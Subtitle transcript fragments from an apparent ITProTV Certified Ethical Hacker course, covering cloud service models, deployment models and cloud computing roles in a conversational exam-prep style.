Mrs.\n\n590\n00:30:08.708 --> 00:30:13.010\nProvider, I need those five hosts 24\ngigs of memory, 24 cores per host,\n\n591\n00:30:13.010 --> 00:30:16.273\na terabyte of storage,\na fiber channel on the backplane.\n\n592\n00:30:16.273 --> 00:30:17.306\nGot all that.\n\n593\n00:30:17.306 --> 00:30:21.001\nNow on top of that,\nI don't wanna load the operating systems.\n\n594\n00:30:21.001 --> 00:30:23.688\nI don't have the licenses,\nI don't wanna worry about it,\n\n595\n00:30:23.688 --> 00:30:26.481\nI don't wanna configure it,\nI just wanna be able to show up and\n\n596\n00:30:26.481 --> 00:30:28.830\nhave it all up and running and\nready for me, right?\n\n597\n00:30:28.830 --> 00:30:31.812\nYou ever go to Disneyland, when you go to\nthe racetrack where they do the go-karts,\n\n598\n00:30:31.812 --> 00:30:33.870\nand you jump out there,\nthe kart's already turned on, so\n\n599\n00:30:33.870 --> 00:30:35.056\nall you gotta do is jump in and go?\n\n600\n00:30:35.056 --> 00:30:36.701\nIt's kinda like that, right?\n\n601\n00:30:36.701 --> 00:30:38.096\nSo, we're just gonna jump in and go.\n\n602\n00:30:38.096 --> 00:30:41.878\nSo with Platform as a Service,\nwe're renting all the infrastructure but\n\n603\n00:30:41.878 --> 00:30:45.477\nwe're also telling the Cloud provider,\nhey configure it for me, and\n\n604\n00:30:45.477 --> 00:30:48.715\ngive me the OS already pre built,\nalready setup, ready to go.\n\n605\n00:30:48.715 --> 00:30:51.635\nAnd by the way,\nyou're gonna do patch management there.\n\n606\n00:30:51.635 --> 00:30:53.549\nYou're gonna manage that Mr. Provider.\n\n607\n00:30:53.549 --> 00:30:57.948\nAll we're gonna do is load the IDE,\nthe Integrated Development Environment,\n\n608\n00:30:57.948 --> 00:31:02.084\nwe're gonna do the hosting for\nthe virtualization on top of the platform,\n\n609\n00:31:02.084 --> 00:31:06.479\npass traditional associated with that Dev\nwork more often than not is a platform\n\n610\n00:31:06.479 --> 00:31:07.092\nservice.\n\n611\n00:31:07.092 --> 00:31:10.281\nSo, a lot of times we're gonna see\ncompanies renting it because they wanna\n\n612\n00:31:10.281 --> 00:31:13.330\nbuild development environments,\nwhere they can do that kind of work.\n\n613\n00:31:13.330 --> 00:31:16.716\nSo yeah, we're gonna come in with all\nthe foundational elements set up and\n\n614\n00:31:16.716 --> 00:31:18.611\nall they got to do is\nload our stuff on top.\n\n615\n00:31:18.611 --> 00:31:21.397\nLoad Visual Studio up,\nload Ruby on Rails right?\n\n616\n00:31:21.397 --> 00:31:24.751\nLoad whatever it may be and\nstart going in there and developing or\n\n617\n00:31:24.751 --> 00:31:27.671\nload up the virtualization stack and\nlet's go ahead and\n\n618\n00:31:27.671 --> 00:31:29.550\nlet's run some VMs to do that work.\n\n619\n00:31:29.550 --> 00:31:32.304\nSo, maybe we'll run the Dev\nenvironment inside VMs.\n\n620\n00:31:32.304 --> 00:31:37.746\nThat's the Platform as a Service and then\nwe move up to SaaS, Software as a Service.\n\n621\n00:31:37.746 --> 00:31:40.464\nSaaS or Software as a Service,\ntop of the stack.\n\n622\n00:31:40.464 --> 00:31:42.863\nSo we've got IaaS and\nPaaS running underneath,\n\n623\n00:31:42.863 --> 00:31:44.742\nwe're adding application load now.\n\n624\n00:31:44.742 --> 00:31:49.501\nSo now what we're gonna do,\nas the customers go to the Amazons of\n\n625\n00:31:49.501 --> 00:31:53.291\nthe world or go to salesforce.com or\nany of those,\n\n626\n00:31:53.291 --> 00:31:58.344\nSaaS providers, because there's\ntwo distinct models with SaaS.\n\n627\n00:31:58.344 --> 00:32:01.348\nYou get hosted application as a service.\n\n628\n00:32:01.348 --> 00:32:01.929\n>> Mm-hm.\n>> So,\n\n629\n00:32:01.929 --> 00:32:04.110\nsalesforce.com is a good example of that,\nright,\n\n630\n00:32:04.110 --> 00:32:08.445\nyou're essentially renting\nthe salesforce app across the platform.\n\n631\n00:32:08.445 --> 00:32:13.276\nOr you can get something like with\nthe Office 365, I wanna rent and\n\n632\n00:32:13.276 --> 00:32:16.609\nget Office as a subscription\nbased solution and\n\n633\n00:32:16.609 --> 00:32:20.874\ndownload Office 16 through\nOffice 365 as a SaaS Model.\n\n634\n00:32:20.874 --> 00:32:23.812\nWhere I'm just renting that\npiece of software, but\n\n635\n00:32:23.812 --> 00:32:27.361\nI'm not having it hosted by the provider,\nI'm just using it.\n\n636\n00:32:27.361 --> 00:32:29.742\nSo, there's two distinct ways we do SaaS.\n\n637\n00:32:29.742 --> 00:32:33.289\nBut the common way we think about\nit is the salesforce.com model.\n\n638\n00:32:33.289 --> 00:32:36.781\nWhere we're essentially gonna have\nthe hosted application running\n\n639\n00:32:36.781 --> 00:32:38.601\non the provider's infrastructure.\n\n640\n00:32:38.601 --> 00:32:44.091\nSo in their data center they control the\nIaaS, and the PaaS, and the SaaS stack.\n\n641\n00:32:44.091 --> 00:32:47.320\nReally as the consumers, the customer,\nI only have to do two things.\n\n642\n00:32:47.320 --> 00:32:51.000\nI have to load my data into the system\nthrough some sort of API or\n\n643\n00:32:51.000 --> 00:32:53.550\nweb based interface,\nan application interface.\n\n644\n00:32:53.550 --> 00:32:55.730\nSo I login, I load up my data or\n\n645\n00:32:55.730 --> 00:33:00.165\nI work with the provider to have a bulk\nupload done initially to seed the system.\n\n646\n00:33:00.165 --> 00:33:04.020\nSome mechanism where I send them the data,\nthey put it in.\n\n647\n00:33:04.020 --> 00:33:06.000\nAnd then the only other thing\nI really have to do, and\n\n648\n00:33:06.000 --> 00:33:10.850\nthe only responsibility I have as\na customer is user account control,\n\n649\n00:33:10.850 --> 00:33:13.080\nessentially user access and management.\n\n650\n00:33:13.080 --> 00:33:17.690\nI've got an interface and API where I\ncan log in, I can provision user access.\n\n651\n00:33:17.690 --> 00:33:21.520\nI'm gonna make Mike and Megan users in\nthe system, as administrator I go in,\n\n652\n00:33:21.520 --> 00:33:25.960\nI log in, I set up their accounts,\nI assign Mike admin rights,\n\n653\n00:33:25.960 --> 00:33:28.530\nI give Megan admin rights,\nthey could see everything.\n\n654\n00:33:28.530 --> 00:33:32.795\nSo I can do account control, and\nI can give access to the data.\n\n655\n00:33:32.795 --> 00:33:37.685\nInitially the upload of the data is\ndone by me, but then the management of\n\n656\n00:33:37.685 --> 00:33:41.285\nthe entire platform from that point\nforward is on the cloud provider.\n\n657\n00:33:41.285 --> 00:33:43.785\nI ultimately own the data, right,\nlet's be clear about that.\n\n658\n00:33:43.785 --> 00:33:45.775\nAs the customer, the data is mine.\n\n659\n00:33:45.775 --> 00:33:48.285\nThe responsibility for ownership is mine.\n\n660\n00:33:48.285 --> 00:33:51.295\nBut the day-to-day maintenance of\nthe data, the backing-up, the management,\n\n661\n00:33:51.295 --> 00:33:53.705\nthe configuration,\nthe patch management and\n\n662\n00:33:53.705 --> 00:33:55.420\nall the stuff is all done by the vendor.\n\n663\n00:33:55.420 --> 00:33:56.400\nNot by me.\n\n664\n00:33:56.400 --> 00:33:59.440\nSo we have to understand\nthe differentiation\n\n665\n00:33:59.440 --> 00:34:01.510\nin the different service models here.\n\n666\n00:34:01.510 --> 00:34:05.040\nBe able to understand how we are going\nto be able to consume in the cloud.\n\n667\n00:34:05.040 --> 00:34:09.910\nAnd also, the responsibility that the\ncustomer versus the provider has clearly\n\n668\n00:34:09.910 --> 00:34:13.846\ndelineated in each model,\nas I talk about, is very important for\n\n669\n00:34:13.846 --> 00:34:17.083\nyou to know with regard not\nonly to exam preparation.\n\n670\n00:34:17.083 --> 00:34:21.107\nBut also in general so that as a security\nprofessional, you understand where you can\n\n671\n00:34:21.107 --> 00:34:24.120\nhave an impact with regards to\nthe kind of things you want to do.\n\n672\n00:34:24.120 --> 00:34:26.210\nIt's also very important.\n\n673\n00:34:26.210 --> 00:34:28.838\nSo separation over responsibilities\nin the cloud is definitely something\n\n674\n00:34:28.838 --> 00:34:29.940\nthat can consider.\n\n675\n00:34:29.940 --> 00:34:32.650\nLet's also talk about\nthe cloud deploying models.\n\n676\n00:34:32.650 --> 00:34:36.020\nI know you have those teed up for us down\nthere underneath all the other stuff.\n\n677\n00:34:37.330 --> 00:34:39.500\nWe have four traditional\ndeployment models.\n\n678\n00:34:39.500 --> 00:34:41.090\nWe have in no particular order but\n\n679\n00:34:41.090 --> 00:34:43.080\nwe'll go in the order that\nMike has them up there.\n\n680\n00:34:43.080 --> 00:34:45.780\nThe private cloud, the community cloud,\nthe public cloud and of course,\n\n681\n00:34:45.780 --> 00:34:46.890\nthe hybrid cloud.\n\n682\n00:34:46.890 --> 00:34:48.370\nSo let's talk about these.\n\n683\n00:34:48.370 --> 00:34:50.930\nPrivate cloud and\npublic cloud I already hinted at,\n\n684\n00:34:50.930 --> 00:34:52.530\nwe talked a bit about in the intro.\n\n685\n00:34:52.530 --> 00:34:56.490\nThe Private cloud is infrastructure\noperated for the benefit of a single\n\n686\n00:34:56.490 --> 00:35:00.940\norganization, available only to the\nauthorized members of that organization.\n\n687\n00:35:00.940 --> 00:35:05.110\nWe would think of this as the old school\nway of talking about an intranet,\n\n688\n00:35:05.110 --> 00:35:08.510\na private internal network not\navailable to the outside world.\n\n689\n00:35:08.510 --> 00:35:11.730\nOnly authorized users\nare gonna be able to use that.\n\n690\n00:35:11.730 --> 00:35:13.180\nThere may be an external interface.\n\n691\n00:35:13.180 --> 00:35:16.590\nSo remote in where we can allow\nauthorized users in through a VPN or\n\n692\n00:35:16.590 --> 00:35:18.350\nsome portal connection.\n\n693\n00:35:18.350 --> 00:35:21.810\nThat's fine but just keep in mind that\nthe private cloud is the internal private\n\n694\n00:35:21.810 --> 00:35:24.830\ninfrastructure that we're running for\nthose people.\n\n695\n00:35:24.830 --> 00:35:27.850\nThe community cloud is interesting\nbecause the community cloud is\n\n696\n00:35:27.850 --> 00:35:29.980\none that most people don't\neven realize exists.\n\n697\n00:35:29.980 --> 00:35:33.600\nYou ask most people about the plan and\nmodel, yeah, private, public, and hybrid.\n\n698\n00:35:33.600 --> 00:35:37.680\nI have a private cloud, a public cloud, or\nI mix the two together, I have a hybrid.\n\n699\n00:35:37.680 --> 00:35:39.650\nAnd people always leave\nout community cloud.\n\n700\n00:35:39.650 --> 00:35:41.630\nAnd then when you talk to them\nabout it they're like whoa I\n\n701\n00:35:41.630 --> 00:35:42.515\ndidn't even realize that.\n\n702\n00:35:42.515 --> 00:35:45.860\nThat makes sense cuz I want to\ndifferentiate internally so\n\n703\n00:35:45.860 --> 00:35:47.560\nthat makes sense.\n\n704\n00:35:47.560 --> 00:35:50.200\nSo let's think about community cloud for\na minute.\n\n705\n00:35:50.200 --> 00:35:53.630\nMost traditional businesses right\nwill have probably a sales and\n\n706\n00:35:53.630 --> 00:35:54.570\nmarketing function.\n\n707\n00:35:54.570 --> 00:35:55.740\nA lot of times internally.\n\n708\n00:35:55.740 --> 00:36:00.890\nA lot of times they will have HR carved\nout probably as a separate business area.\n\n709\n00:36:00.890 --> 00:36:04.700\nAnd they may have things like research and\ndevelopment or something like that.\n\n710\n00:36:04.700 --> 00:36:08.170\nSo let's say hypothetically of those\nthree business units inside the business.\n\n711\n00:36:08.170 --> 00:36:16.640\nWe have finance or some control element\naround the finance or the expenses.\n\n712\n00:36:16.640 --> 00:36:18.650\nWe have HR separately.\n\n713\n00:36:18.650 --> 00:36:20.120\nWe have sales and marketing.\n\n714\n00:36:20.120 --> 00:36:22.680\nAnd we have R&D, research and development.\n\n715\n00:36:22.680 --> 00:36:27.170\nIf we're gonna be able to give all\nthose individuals in those departments,\n\n716\n00:36:27.170 --> 00:36:30.640\ninfrastructure, just in a common group for\nthe organization.\n\n717\n00:36:30.640 --> 00:36:31.490\nWe use a private cloud.\n\n718\n00:36:31.490 --> 00:36:32.650\nWe don't differentiate.\n\n719\n00:36:32.650 --> 00:36:37.730\nFinance, and HR, sales and\nmarketing all run side-by-side on the same\n\n720\n00:36:38.920 --> 00:36:42.040\ninfrastructure, and everybody's happy.\n\n721\n00:36:42.040 --> 00:36:46.590\nOr if HR comes to us as the IT functions\nsays hey you know, it's okay to be with\n\n722\n00:36:46.590 --> 00:36:51.960\neverybody but we would really like our\nown separate infrastructure as a cloud.\n\n723\n00:36:51.960 --> 00:36:55.390\nWe have unique line of\nbusiness applications we run.\n\n724\n00:36:55.390 --> 00:36:59.530\nWe have very proprietary information\nthat should not be shared commonly.\n\n725\n00:36:59.530 --> 00:37:03.160\nWe're worried about privacy of financial\ntransactions and customer data.\n\n726\n00:37:04.250 --> 00:37:09.930\nHR may be worried about internal\nemployee information, things like that.\n\n727\n00:37:09.930 --> 00:37:13.060\nSo we wanna run that stuff,\nwanna have it separate.\n\n728\n00:37:13.060 --> 00:37:15.700\nWell, we could setup individual\nprivate clouds for them.\n\n729\n00:37:15.700 --> 00:37:19.150\nBut the reality is we could\nessentially take that same concept,\n\n730\n00:37:19.150 --> 00:37:20.910\nwhich is really what a community cloud is.\n\n731\n00:37:20.910 --> 00:37:25.440\nAnd simply say we'll give you\na specific area dedicated to you\n\n732\n00:37:25.440 --> 00:37:27.170\ninside of the private cloud,\n\n733\n00:37:27.170 --> 00:37:30.510\nthat's uniquely associated with\nyour organization identity.\n\n734\n00:37:30.510 --> 00:37:33.680\nIn other words, a group,\nan interest group, a community is formed.\n\n735\n00:37:33.680 --> 00:37:35.790\nAnd we say,\nthose people want their own resources.\n\n736\n00:37:35.790 --> 00:37:39.310\nAnd we give them dedicated resources for\nthat community.\n\n737\n00:37:39.310 --> 00:37:41.870\nSo, that's where we get\ncommunity cloud concept from.\n\n738\n00:37:41.870 --> 00:37:46.140\nIt is essentially, typically associated\nwith security or compliance concerns.\n\n739\n00:37:46.140 --> 00:37:48.290\nWant a regulated and safeguard that data.\n\n740\n00:37:48.290 --> 00:37:50.420\nThink of it as a private cloud\nwithin the private cloud.\n\n741\n00:37:50.420 --> 00:37:54.870\nIt's just a subdivided private cloud\nfurther segmenting that group of users.\n\n742\n00:37:54.870 --> 00:37:56.070\nIt's almost like a VLAN.\n\n743\n00:37:56.070 --> 00:38:00.080\nLet's logically subdivide the network and\ncreate a separate secure area and\n\n744\n00:38:00.080 --> 00:38:02.308\nthe community cloud is\nthe VLAN of the cloud world.\n\n745\n00:38:02.308 --> 00:38:02.949\n>> All right.\n\n746\n00:38:02.949 --> 00:38:04.812\n>> Red-headed stepchild though it is.\n\n747\n00:38:04.812 --> 00:38:06.330\n>> [LAUGH] All right, so we have that.\n\n748\n00:38:06.330 --> 00:38:07.650\nThen we have public clouds.\n\n749\n00:38:07.650 --> 00:38:11.320\nA public cloud is a cloud that\nis available to everybody\n\n750\n00:38:11.320 --> 00:38:12.890\nfrom anywhere in the world at any time.\n\n751\n00:38:12.890 --> 00:38:15.770\nEssentially, think of\nthe world wide web is\n\n752\n00:38:15.770 --> 00:38:19.360\nessentially the largest example of\na public cloud we operate today.\n\n753\n00:38:19.360 --> 00:38:20.830\nThe internet is public cloud.\n\n754\n00:38:20.830 --> 00:38:25.450\nAnd then the hybrid cloud is gonna\nbe a cloud that is joined or\n\n755\n00:38:25.450 --> 00:38:28.790\nmade up of two or\nmore of these other cloud types.\n\n756\n00:38:28.790 --> 00:38:31.130\nThe traditional model is\nI have both public and\n\n757\n00:38:31.130 --> 00:38:34.770\nprivate clouds, I put some portal\nout there to link the two together.\n\n758\n00:38:34.770 --> 00:38:38.150\nI allow you to go in and\nsee public aspects of the company, but\n\n759\n00:38:38.150 --> 00:38:41.560\nthen you log in securely through\nthe portal to get to the private side.\n\n760\n00:38:41.560 --> 00:38:44.670\nThink of banking, for instance,\ntraditionally they do this\n\n761\n00:38:44.670 --> 00:38:48.540\nwhere the bank sites have,\nyou have a public persona on the web.\n\n762\n00:38:48.540 --> 00:38:51.460\nBut if you're an employee or\nif you are a member,\n\n763\n00:38:51.460 --> 00:38:54.390\nif you are a customer,\nthere's a secure logon.\n\n764\n00:38:54.390 --> 00:38:58.370\nYou go through, you get to the internal\nsite, where your account data is, and\n\n765\n00:38:58.370 --> 00:39:00.110\nyou know, all that kind of stuff.\n\n766\n00:39:00.110 --> 00:39:02.630\nAny of those kind of things are all\ngoing to be considered hybrid class,\n\n767\n00:39:02.630 --> 00:39:04.568\nwhere we mix both public and\nprivate infrastructure.\n\n768\n00:39:04.568 --> 00:39:09.293\nAnd we have the ability to cross between\nthem, typically with some secure portal,\n\n769\n00:39:09.293 --> 00:39:11.540\nor some authentication or log on.\n\n770\n00:39:11.540 --> 00:39:15.850\nYou can think of this as having\na some gateway system or\n\n771\n00:39:15.850 --> 00:39:20.030\nRAS solution, right remote access in so\nwe can get in and that kind of stuff.\n\n772\n00:39:20.030 --> 00:39:22.560\nAny of that all that will\nbe part of that discussion.\n\n773\n00:39:24.380 --> 00:39:24.890\nGood?\n\n774\n00:39:24.890 --> 00:39:25.710\n>> Absolutely.\n\n775\n00:39:25.710 --> 00:39:29.780\nA great look and a first look at\nwhat we've got for cloud computing.\n\n776\n00:39:29.780 --> 00:39:33.670\nTake a look at a couple of the models,\ndefine some of those terms that are gonna\n\n777\n00:39:33.670 --> 00:39:37.560\nset the tone or give us that\nfoundational information we need\n\n778\n00:39:37.560 --> 00:39:40.660\nas we go through the rest of these\nmodules here dealing with cloud.\n\n779\n00:39:40.660 --> 00:39:42.090\nSo we appreciate that.\n\n780\n00:39:42.090 --> 00:39:43.230\nGreat definitions.\n\n781\n00:39:43.230 --> 00:39:44.960\nHope everybody out there enjoyed watching.\n\n782\n00:39:44.960 --> 00:39:47.930\nSigning out for ITProTV, I'm Mike Rodrick.\n\n783\n00:39:47.930 --> 00:39:50.280\n>> I am a cumulus cloud.\n\n784\n00:39:50.280 --> 00:39:51.988\n>> And we'll see you next time.\n\n785\n00:39:51.988 --> 00:39:58.305\n[MUSIC]\n\n",

00:00:19.361\nI'm your host Mike Roderick and\ntoday we're doing CEH Version 9.\n\n4\n00:00:19.361 --> 00:00:20.270\nHow's that for you?\n\n5\n00:00:20.270 --> 00:00:21.601\n>> That's what I, that's the one.\n\n6\n00:00:21.601 --> 00:00:23.798\nThat's the thing I was\ntalking about right there.\n\n7\n00:00:23.798 --> 00:00:24.800\n>> [LAUGH] That's what\nyou were looking for.\n\n8\n00:00:24.800 --> 00:00:26.500\nAll right, so we are doing Version 9.\n\n9\n00:00:26.500 --> 00:00:29.475\nAnd specifically in this episode,\nwe're gonna be taking a look, or\n\n10\n00:00:29.475 --> 00:00:32.677\ncontinuing continuing on, actually,\nour talk about cloud computing.\n\n11\n00:00:32.677 --> 00:00:35.931\nWe're gonna start looking at some of\nthe threats that we have faced in cloud\n\n12\n00:00:35.931 --> 00:00:36.508\ncomputing.\n\n13\n00:00:36.508 --> 00:00:39.873\nAnd of course, no episode would be\ncomplete without some additional\n\n14\n00:00:39.873 --> 00:00:42.145\nterminology that we need\nto be familiar with.\n\n15\n00:00:42.145 --> 00:00:43.830\nSo we've got some of that for\nyou, as well.\n\n16\n00:00:43.830 --> 00:00:46.550\nAnd here to go through all of\nthat with us is Mr. Adam Gordon.\n\n17\n00:00:46.550 --> 00:00:47.155\nHow you doing Adam?\n\n18\n00:00:47.155 --> 00:00:47.900\n>> [LAUGH] I'm good, I'm good.\n\n19\n00:00:47.900 --> 00:00:48.797\n>> [LAUGH]\n>> So\n\n20\n00:00:48.797 --> 00:00:51.352\nwe're gonna talk a little bit\nmore about some of the roles and\n\n21\n00:00:51.352 --> 00:00:54.271\nassociated things that we're gonna\nbe doing with regards to cloud.\n\n22\n00:00:54.271 --> 00:00:57.844\nAnd then we're gonna move in, as we've\nalready done, but zero in at a more\n\n23\n00:00:57.844 --> 00:01:01.666\nthoughtful level around virtualization and\nthe benefits of virtualization.\n\n24\n00:01:01.666 --> 00:01:05.800\nBut also the concerns around\nit with regards to the cloud.\n\n25\n00:01:05.800 --> 00:01:09.970\nSo let's start by talking about some of\nthe roles associated with cloud computing.\n\n26\n00:01:09.970 --> 00:01:14.640\nI know that we often will talk\na lot about cloud customers.\n\n27\n00:01:14.640 --> 00:01:18.440\nWe often will hear them referred to\nas either customers or consumers.\n\n28\n00:01:18.440 --> 00:01:22.470\nWe may sometimes talk about cloud\nproviders, cloud service providers,\n\n29\n00:01:22.470 --> 00:01:23.880\nthey are one and the same.\n\n30\n00:01:23.880 --> 00:01:25.884\nSo, we have to define a little\nbit what those rules are.\n\n31\n00:01:25.884 --> 00:01:28.999\nMake sure we understand them\nfrom an exam perspective.\n\n32\n00:01:28.999 --> 00:01:32.687\nSo it's good to have knowledge of basic\nconcepts, basic roles, basic definitions.\n\n33\n00:01:32.687 --> 00:01:34.793\nI often talk to my students and\n\n34\n00:01:34.793 --> 00:01:40.029\nmy customers when we do this kind of\nwork with you, certainly at ITProTv.\n\n35\n00:01:40.029 --> 00:01:43.959\nWe try to make sure you know what the most\nimportant things are to focus on.\n\n36\n00:01:43.959 --> 00:01:44.848\nBut in a broad sense,\n\n37\n00:01:44.848 --> 00:01:47.623\nI will tell my customers when we\nhave these kind of conversations.\n\n38\n00:01:47.623 --> 00:01:51.571\nIt's not the most important thing to\nbecome the expert at this particular\n\n39\n00:01:51.571 --> 00:01:52.662\ndiscussion point.\n\n40\n00:01:52.662 --> 00:01:59.150\nBut rather have a one, maybe two\nsentence definition of what the term is.\n\n41\n00:01:59.150 --> 00:02:01.280\nA general understanding of the concept,\n\n42\n00:02:01.280 --> 00:02:05.110\nbe able to apply that knowledge,\nroll it forward in the conversation.\n\n43\n00:02:05.110 --> 00:02:06.235\nThat's the level, the bar,\n\n44\n00:02:06.235 --> 00:02:08.486\nthat we wanna be at with regards\nto knowledge acquisition.\n\n45\n00:02:08.486 --> 00:02:11.385\nAs you look to prepare for\nthe CEH exam, across any and\n\n46\n00:02:11.385 --> 00:02:13.196\nall of the episodes we have done.\n\n47\n00:02:13.196 --> 00:02:17.999\nAnd have talked about in this area and\nwill continue to as we finish up\n\n48\n00:02:17.999 --> 00:02:22.060\nthe material around the CEH Version 9,\nCEH Version 9.\n\n49\n00:02:22.060 --> 00:02:24.048\n>> Yeah, that was like.\n\n50\n00:02:24.048 --> 00:02:25.743\n>> [LAUGH]\n>> You gotta work on that.\n\n51\n00:02:25.743 --> 00:02:26.817\n[CROSSTALK] You gotta\nrecord that [CROSSTALK].\n\n52\n00:02:26.817 --> 00:02:27.761\n>> [INAUDIBLE] Do that on demand.\n\n53\n00:02:27.761 --> 00:02:31.295\n>> Like when we can just hit\nthe button and that'll happen.\n\n54\n00:02:31.295 --> 00:02:32.460\n>> [LAUGH]\n>> That's\n\n55\n00:02:32.460 --> 00:02:33.810\nalmost like one of those talking dolls.\n\n56\n00:02:33.810 --> 00:02:34.910\n>> Yeah.\n>> We could pull the little string and\n\n57\n00:02:34.910 --> 00:02:36.290\nthe Mikey doll will talk and say.\n\n58\n00:02:36.290 --> 00:02:38.120\n>> Version 9\n>> That's the one right there,\n\n59\n00:02:38.120 --> 00:02:39.080\nversion nine, all right.\n\n60\n00:02:39.080 --> 00:02:41.637\nSo when we are thinking\nabout any of that material,\n\n61\n00:02:41.637 --> 00:02:43.371\nkeep in mind it's a general idea.\n\n62\n00:02:43.371 --> 00:02:47.522\nWhat you wanna be able to do especially\nwith these vocabulary terms is define them\n\n63\n00:02:47.522 --> 00:02:49.488\nquickly, understand what they are.\n\n64\n00:02:49.488 --> 00:02:52.204\nMake sure you can pick that\ndefinition out if asked,\n\n65\n00:02:52.204 --> 00:02:54.993\napply that definition to\nthe situation if required.\n\n66\n00:02:54.993 --> 00:02:58.560\nUse that knowledge to answer the question.\n\n67\n00:02:58.560 --> 00:03:02.260\nBut you're not looking for\nthe secret hidden meaning of life here.\n\n68\n00:03:02.260 --> 00:03:05.190\nSo just make sure you have the general\nlevel of understanding that\n\n69\n00:03:05.190 --> 00:03:06.460\nwe're talking about.\n\n70\n00:03:06.460 --> 00:03:09.049\nSo having said that, can we,\nthank you very much I appreciate you\n\n71\n00:03:09.049 --> 00:03:11.747\nkeeping that ping pong game going back and\nforth behind the scenes.\n\n72\n00:03:11.747 --> 00:03:14.015\nI'm here to work, sir, I'm here to work.\n\n73\n00:03:14.015 --> 00:03:16.574\n[CROSSTALK] I take this seriously and\n\n74\n00:03:16.574 --> 00:03:21.271\nyou texting with people while we\nare talking is just not helping.\n\n75\n00:03:21.271 --> 00:03:23.640\nI'm sorry that's just not appropriate.\n\n76\n00:03:23.640 --> 00:03:25.390\n>> Now we're in trouble.\n\n77\n00:03:25.390 --> 00:03:26.243\n>> Alright, Mike's in trouble.\n\n78\n00:03:26.243 --> 00:03:27.440\n>> [LAUGH].\n>> So let's, I'm only kidding,\n\n79\n00:03:27.440 --> 00:03:30.870\nMike's just chatting with one of our\nviewers out there in the chat window while\n\n80\n00:03:30.870 --> 00:03:32.320\nwe are talking.\n\n81\n00:03:32.320 --> 00:03:35.010\nSo can we throw up\nthe definitions that Mike has?\n\n82\n00:03:35.010 --> 00:03:38.070\nThere we go, for roles on the screen.\n\n83\n00:03:38.070 --> 00:03:40.950\nLet's talk about these five\ndifferent roles that we've defined.\n\n84\n00:03:40.950 --> 00:03:43.164\nLet's go to fullscreen if we can just to\ntake a look just to see them a little\n\n85\n00:03:43.164 --> 00:03:44.223\nbit better, thank you very much.\n\n86\n00:03:44.223 --> 00:03:49.133\nSo cloud consumer, cloud service provider,\ncloud carrier, cloud auditor, and or\n\n87\n00:03:49.133 --> 00:03:50.030\ncloud broker.\n\n88\n00:03:50.030 --> 00:03:52.434\nLet's go through and\nthe talk about each one.\n\n89\n00:03:52.434 --> 00:03:56.555\nThe cloud consumer is essentially gonna\nbe as I talked, about the cloud customer.\n\n90\n00:03:56.555 --> 00:04:01.060\nThis is the person, the entity that\nis gonna buy cloud services and\n\n91\n00:04:01.060 --> 00:04:05.340\nuse them on an on going basis\nfrom a provider of some kind.\n\n92\n00:04:05.340 --> 00:04:08.117\nThe cloud service provider is going\nto be the service provider of record.\n\n93\n00:04:08.117 --> 00:04:12.032\nThat is the cloud provider,\nthat is the business,\n\n94\n00:04:12.032 --> 00:04:17.330\nthe entity that is selling cloud\nservices to the cloud consumer.\n\n95\n00:04:17.330 --> 00:04:18.197\nThe cloud consumer and\n\n96\n00:04:18.197 --> 00:04:21.166\nthe cloud service provider essentially\nform a partnership with each other.\n\n97\n00:04:21.166 --> 00:04:24.967\nTypically cemented in place by\na hosting agreement and an SLA,\n\n98\n00:04:24.967 --> 00:04:27.346\nservice level agreement of some kind.\n\n99\n00:04:27.346 --> 00:04:28.547\nThat brokers and\n\n100\n00:04:28.547 --> 00:04:33.720\nwill actually then control\nthe parameters of that conversation.\n\n101\n00:04:33.720 --> 00:04:37.350\nThe cloud service provider commits\nto certain levels of service and\n\n102\n00:04:37.350 --> 00:04:38.450\nfunctionality.\n\n103\n00:04:38.450 --> 00:04:41.980\nThe cloud customer commits to paying\na certain amount of money on time,\n\n104\n00:04:41.980 --> 00:04:43.960\nover a certain amount of time.\n\n105\n00:04:43.960 --> 00:04:48.472\nAnd the two then go off and then are able\nto engage in cloud related activities.\n\n106\n00:04:48.472 --> 00:04:51.332\nSo, make sure we just understand\nthe nature of that relationship.\n\n107\n00:04:51.332 --> 00:04:56.314\nSome of the supporting documentation\nitems like SLA, service level agreements.\n\n108\n00:04:56.314 --> 00:04:59.327\nLike hosting agreements,\nimportant to have knowledge of them.\n\n109\n00:04:59.327 --> 00:05:01.997\nThe cloud carrier, the intermediary for\n\n110\n00:05:01.997 --> 00:05:05.590\nservice provisioning between customer and\nprovider.\n\n111\n00:05:05.590 --> 00:05:08.180\nWell that's kind of a wordy\nnerdy kind of definition.\n\n112\n00:05:08.180 --> 00:05:08.859\nLet's see if we can make\nthat a little simpler.\n\n113\n00:05:08.859 --> 00:05:11.548\nSo what the cloud carrier really is,\n\n114\n00:05:11.548 --> 00:05:15.121\nis going to be the underlying\nservice provider.\n\n115\n00:05:15.121 --> 00:05:19.032\nThat provides the bandwidth that the cloud\ncarrier is really in the bandwidth\n\n116\n00:05:19.032 --> 00:05:19.640\nbusiness.\n\n117\n00:05:19.640 --> 00:05:23.775\nProviding the connection for the customer\nand the provider to allow them to\n\n118\n00:05:23.775 --> 00:05:28.630\ncommunicate and consume services and\noffer services between each other.\n\n119\n00:05:28.630 --> 00:05:30.760\nA lot of cloud providers\nmay also be cloud carriers.\n\n120\n00:05:30.760 --> 00:05:32.418\nThey may in fact be one and the same.\n\n121\n00:05:32.418 --> 00:05:35.766\nBut not all cloud providers\nare going to be cloud carriers.\n\n122\n00:05:35.766 --> 00:05:37.726\nNot all providers providers,\nin other words,\n\n123\n00:05:37.726 --> 00:05:41.370\nare going to be able to bring bandwidth\nto the table along with cloud services.\n\n124\n00:05:41.370 --> 00:05:44.820\nGoogle happens to be in the cloud\ncarrier and the cloud provider business.\n\n125\n00:05:44.820 --> 00:05:47.230\nThey're trying to fiberize the world.\n\n126\n00:05:47.230 --> 00:05:51.670\nBut, the reality is, Amazon, Microsoft,\nwhile they may own subsidiary companies,\n\n127\n00:05:51.670 --> 00:05:54.910\nthat certainly and they do,\nare in the cloud carrier business.\n\n128\n00:05:54.910 --> 00:05:58.971\nThey also rely heavily on third-party\nproviders that are gonna be able to\n\n129\n00:05:58.971 --> 00:06:00.878\nprovide interconnects for them.\n\n130\n00:06:00.878 --> 00:06:05.630\nEspecially the last mile in local areas\nwhere they probably don't own that.\n\n131\n00:06:05.630 --> 00:06:08.860\nSo that's important, so\nyou wanna make sure you understand that.\n\n132\n00:06:08.860 --> 00:06:13.490\nCould auditor, or cloud auditing as a\nfunction, you can think of it either way.\n\n133\n00:06:13.490 --> 00:06:17.110\nThe cloud auditor is gonna be that\nindependent third party company.\n\n134\n00:06:17.110 --> 00:06:18.750\nThink of the Deloittes of the world,\n\n135\n00:06:18.750 --> 00:06:21.760\nthink of the 